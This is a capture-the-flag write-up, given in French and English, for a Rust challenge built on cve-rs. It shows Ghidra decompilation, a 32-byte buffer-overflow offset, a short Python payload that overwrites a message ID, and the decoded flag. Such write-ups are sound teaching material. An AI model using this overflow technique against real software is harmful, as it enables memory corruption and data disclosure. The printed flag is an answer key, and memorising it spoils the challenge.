# Safe but Unsafe Rust

## Write-up FR



En exécutant le binaire on obtient une liste de commandes:
```
./prieure 
cve-rs 0.6.0
Speykious:BrightShard:Creative0708
Blazingly fast memory vulnerabilities, written in 100% safe Rust.

Usage: prieure [COMMAND]

Commands:
  solve  Solve the puzzle that protects the Prieure de la Rouille's secret.
  help   Print this message or the help of the given subcommand(s)
  ```

Nous avons la commande solve et un indice que ce challenge est basé sur cve-rs. Exécutons la commande solve:

```
./prieure solve
Flag is at: 117637889
Insert a new book in the library. Provide the title of the book:
```

Nous avons une indication sur une valeur en lien avec le flag mais nous ne savons pas ce que c'est. En donnant un titre au hasard, on obtiens:
```
./prieure solve
Flag is at: 117637889
Insert a new book in the library. Provide the title of the book: aalo

Your message is at: 0
FLAG: [97, 97, 108, 111, 10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
```

Ceci n'est pas un flag valide...

Cependant, nous avons une indication que notre message est à 0. À ce stade, il est nécessaire de regarder le binaire dans Ghidra. Le main exécute la fonction cve_rs::main:

```
void main(int param_1,undefined8 param_2)

{
  std::rt::lang_start(cve_rs::main,(long)param_1,param_2,0);
  return;
}
```

Dans cette fonction, on voit notre commande solve qui exécute buffer_overflow::buffer_overflow() (ce qui nous donne un bon indice sur le challenge aussi).

```
  else {
    uVar3 = buffer_overflow::buffer_overflow();
```

Dans cette fonction, on a la lecture du flag:
```
  std::fs::File::open(local_4c8,
                      "flag.txt
```

Il faut alors trouver la structure Message et ses attributs. On peut le faire de plusieurs façons (statique, dynamique) mais on a aussi un debug print dans le binaire qui nous aide à trouver l'offset de l'overflow d'un attribut à l'autre. En trouvant l'offset 32 on peut commencer à changer la valeur écrite à l'écran:

```
./prieure solve 
Flag is at: 117637889
Insert a new book in the library. Provide the title of the book: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Your message is at: 2625
FLAG: [65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65]
```

On voit maintenant notre entrée en mémoire mais pas de flag... Essayons de mettre la même valeur que celle du flag:

```
python
hex(117637889)
0x7030301
with open("payload", "wb") as payload_file:
    payload_file.write(b"A"*32 + "\x01\x03\x03\x07\n")

./prieure solve < payload 
Flag is at: 117637889
Insert a new book in the library. Provide the title of the book: 
Your message is at: 117637889
FLAG: [112, 111, 108, 121, 99, 121, 98, 101, 114, 123, 76, 52, 95, 82, 48, 85, 49, 76, 76, 51, 95, 67, 52, 95, 66, 82, 49, 53, 51, 125, 10, 0]
FLAG: [65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65]
```

On obtient alors le flag car le programme va écrire tous les messages avec le même ID!

```
python
>>> flag = [112, 111, 108, 121, 99, 121, 98, 101, 114, 123, 76, 52, 95, 82, 48, 85, 49, 76, 76, 51, 95, 67, 52, 95, 66, 82, 49, 53, 51, 125, 10, 0]
>>> "".join(chr(c) for c in flag)
'polycyber{L4_R0U1LL3_C4_BR153}\n\x00'
```

## Write-up EN

When executing the binary, we get some commands to try:
```
./prieure 
cve-rs 0.6.0
Speykious:BrightShard:Creative0708
Blazingly fast memory vulnerabilities, written in 100% safe Rust.

Usage: prieure [COMMAND]

Commands:
  solve  Solve the puzzle that protects the Prieure de la Rouille's secret.
  help   Print this message or the help of the given subcommand(s)
  ```

The solve command is there with a hint that this challenge is based on cve-rs. Let's try the solve command:

```
./prieure solve
Flag is at: 117637889
Insert a new book in the library. Provide the title of the book:
```

With have a value linked with the flag and asked to provide a title:

```
./prieure solve
Flag is at: 117637889
Insert a new book in the library. Provide the title of the book: aalo

Your message is at: 0
FLAG: [97, 97, 108, 111, 10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
```

That's not a valid flag...

That being said, we have an indication that our message is at 0. Let's go check the binary in Ghidra. The binary's main function executes the cve_rs::main:

```
void main(int param_1,undefined8 param_2)

{
  std::rt::lang_start(cve_rs::main,(long)param_1,param_2,0);
  return;
}
```

Within this function, we can see our solve command executing the buffer_overflow::buffer_overflow() function (which is also a pretty good hint). 

```
  else {
    uVar3 = buffer_overflow::buffer_overflow();
```

In this function, we can see that it reads the flag:
```
  std::fs::File::open(local_4c8,
                      "flag.txt
```

We then need to figure out the structure we need to overflow. This can be done statically and dynamically, but we also have a handy debug print in our binary which we can use to find the offset. When entering more than 32 chars, you'll start to see changes in the ID of the book you entered:

```
./prieure solve 
Flag is at: 117637889
Insert a new book in the library. Provide the title of the book: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Your message is at: 2625
FLAG: [65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65]
```

We can see our input but no flag. Let's try to match those values:

```
python
hex(117637889)
0x7030301
with open("payload", "wb") as payload_file:
    payload_file.write(b"A"*32 + "\x01\x03\x03\x07\n")

./prieure solve < payload 
Flag is at: 117637889
Insert a new book in the library. Provide the title of the book: 
Your message is at: 117637889
FLAG: [112, 111, 108, 121, 99, 121, 98, 101, 114, 123, 76, 52, 95, 82, 48, 85, 49, 76, 76, 51, 95, 67, 52, 95, 66, 82, 49, 53, 51, 125, 10, 0]
FLAG: [65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65]
```

We then get the flag as our program prints every book with the same ID as ours.

```
python
>>> flag = [112, 111, 108, 121, 99, 121, 98, 101, 114, 123, 76, 52, 95, 82, 48, 85, 49, 76, 76, 51, 95, 67, 52, 95, 66, 82, 49, 53, 51, 125, 10, 0]
>>> "".join(chr(c) for c in flag)
'polycyber{L4_R0U1LL3_C4_BR153}\n\x00'
```

## Flag

`polycyber{L4_R0U1LL3_C4_BR153}`
